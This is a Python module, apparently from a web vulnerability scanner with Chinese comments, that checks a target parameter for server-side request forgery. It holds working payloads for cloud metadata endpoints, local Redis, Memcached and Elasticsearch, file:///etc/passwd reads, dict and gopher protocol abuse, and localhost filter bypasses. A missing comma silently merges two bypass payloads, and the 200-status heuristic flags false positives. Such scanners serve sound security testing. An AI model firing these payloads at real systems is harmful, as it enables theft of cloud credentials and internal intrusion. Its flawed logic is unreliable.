#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) 验证模块

包含:
- SSRFVerifierMixin: SSRF 验证混入类
  - verify_ssrf: SSRF 漏洞验证
"""
import logging
import re
import secrets
from typing import Any, Dict, Optional

from .models import VerificationResult

logger = logging.getLogger(__name__)


class SSRFVerifierMixin:
    """SSRF 验证混入类"""

    def verify_ssrf(
        self,
        url: str,
        param: str,
        callback_url: Optional[str] = None,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, Any]] = None,
        data: Any = None,
        json_data: Any = None,
    ) -> VerificationResult:
        """SSRF 漏洞验证

        Args:
            url: 目标 URL
            param: 注入参数名
            callback_url: 回调 URL（用于 OOB 检测），如果未提供则使用内部检测
            method: HTTP 方法
            headers: 自定义请求头
            params: URL 参数
            data: POST 数据
            json_data: JSON 数据
        """
        # 生成唯一标识符
        unique_id = secrets.token_hex(8)

        # 内部服务探测 - 不需要外部回调
        internal_targets = [
            # 云元数据服务
            (
                "http://169.254.169.254/latest/meta-data/",
                r"ami-id|instance-id|hostname",
                "AWS Metadata",
            ),
            (
                "http://metadata.google.internal/computeMetadata/v1/",
                r"project/|instance/",
                "GCP Metadata",
            ),
            (
                "http://169.254.169.254/metadata/instance",
                r"compute|vmId",
                "Azure Metadata",
            ),
            # 本地服务
            ("http://127.0.0.1:22/", r"SSH|OpenSSH", "SSH Service"),
            (
                "http://localhost:6379/",
                r"REDIS|ERR wrong number",
                "Redis Service",
            ),
            (
                "http://127.0.0.1:11211/stats",
                r"STAT|pid|uptime",
                "Memcached Service",
            ),
            (
                "http://localhost:9200/_cluster/health",
                r"cluster_name|status",
                "Elasticsearch",
            ),
            # 内网 IP 范围
            ("http://10.0.0.1/", r".*", "Internal Network (10.x)"),
            ("http://172.16.0.1/", r".*", "Internal Network (172.16.x)"),
            ("http://192.168.0.1/", r".*", "Internal Network (192.168.x)"),
        ]

        # 协议探测
        protocol_payloads = [
            ("file:///etc/passwd", r"root:.*:0:0:", "File Protocol"),
            ("file:///c:/windows/win.ini", r"\[fonts\]", "File Protocol (Windows)"),
            ("dict://127.0.0.1:6379/info", r"redis_version", "Dict Protocol"),
            ("gopher://127.0.0.1:6379/_INFO", r"redis", "Gopher Protocol"),
        ]

        # 测试内部目标
        for target_url, pattern, service_name in internal_targets:
            test_url, body_data, request_headers = self._prepare_request(
                url=url,
                param=param,
                payload=target_url,
                method=method,
                headers=headers,
                params=params,
                data=data,
                json_data=json_data,
            )
            response_body, code, elapsed, length = self._request(
                test_url,
                method=method,
                data=body_data,
                headers=request_headers,
            )

            if response_body and re.search(pattern, response_body, re.IGNORECASE):
                return VerificationResult(
                    vuln_type="SSRF (Server-Side Request Forgery)",
                    payload=target_url,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high",
                    evidence=f"Accessed internal service: {service_name}",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="internal_service",
                    recommendation="实施 URL 白名单, 禁用危险协议, 限制出站请求",
                )

        # 测试协议
        for proto_payload, pattern, proto_name in protocol_payloads:
            test_url, body_data, request_headers = self._prepare_request(
                url=url,
                param=param,
                payload=proto_payload,
                method=method,
                headers=headers,
                params=params,
                data=data,
                json_data=json_data,
            )
            response_body, code, elapsed, length = self._request(
                test_url,
                method=method,
                data=body_data,
                headers=request_headers,
            )

            if response_body and re.search(pattern, response_body, re.IGNORECASE):
                return VerificationResult(
                    vuln_type="SSRF (Server-Side Request Forgery)",
                    payload=proto_payload,
                    url=test_url,
                    is_vulnerable=True,
                    confidence="high",
                    evidence=f"Dangerous protocol accessible: {proto_name}",
                    response_time=elapsed,
                    response_code=code,
                    response_length=length,
                    verification_method="protocol_abuse",
                    recommendation="禁用 file://, dict://, gopher:// 等危险协议",
                )

        # 如果提供了回调 URL，进行 OOB 检测
        if callback_url:
            oob_payload = f"{callback_url}/{unique_id}"
            test_url, body_data, request_headers = self._prepare_request(
                url=url,
                param=param,
                payload=oob_payload,
                method=method,
                headers=headers,
                params=params,
                data=data,
                json_data=json_data,
            )
            _, code, elapsed, length = self._request(
                test_url,
                method=method,
                data=body_data,
                headers=request_headers,
            )

            # OOB 检测需要外部确认，这里返回可能存在的结果
            return VerificationResult(
                vuln_type="SSRF (Potential)",
                payload=oob_payload,
                url=test_url,
                is_vulnerable=False,  # 需要外部确认
                confidence="low",
                evidence=f"OOB callback sent to {callback_url}, check callback server for requests",
                response_time=elapsed,
                response_code=code,
                response_length=length,
                verification_method="oob_callback",
                recommendation="检查回调服务器是否收到请求",
            )

        # URL 绕过技巧
        bypass_payloads = [
            "http://127.1/",  # 短格式
            "http://0177.0.0.1/",  # 八进制
            "http://2130706433/",  # 十进制
            "http://0x7f.0x0.0x0.0x1/",  # 十六进制
            "http://127.0.0.1.xip.io/",  # DNS 重绑定
            "http://127.0.0.1.nip.io/",  # DNS 重绑定
            "http://[::1]/",  # IPv6 localhost
            "http://[::]/" "http://127。0。0。1/",  # Unicode 点
            "http://①②⑦.0.0.1/",  # Unicode 数字
        ]

        for bypass in bypass_payloads:
            test_url, body_data, request_headers = self._prepare_request(
                url=url,
                param=param,
                payload=bypass,
                method=method,
                headers=headers,
                params=params,
                data=data,
                json_data=json_data,
            )
            response_body, code, elapsed, length = self._request(
                test_url,
                method=method,
                data=body_data,
                headers=request_headers,
            )

            # 检测响应是否表明访问了本地服务
            if response_body and len(response_body) > 0:
                # 简单启发式：响应不是错误页面
                if code == 200 and length > 100:
                    return VerificationResult(
                        vuln_type="SSRF (Bypass Detected)",
                        payload=bypass,
                        url=test_url,
                        is_vulnerable=True,
                        confidence="medium",
                        evidence=f"Bypass technique successful: {bypass[:30]}",
                        response_time=elapsed,
                        response_code=code,
                        response_length=length,
                        verification_method="bypass_detection",
                        recommendation="实施严格的 URL 解析和验证",
                    )

        return VerificationResult(
            vuln_type="SSRF",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence="No SSRF indicators found",
            response_time=0,
            response_code=200,
            response_length=0,
            verification_method="ssrf_detection",
        )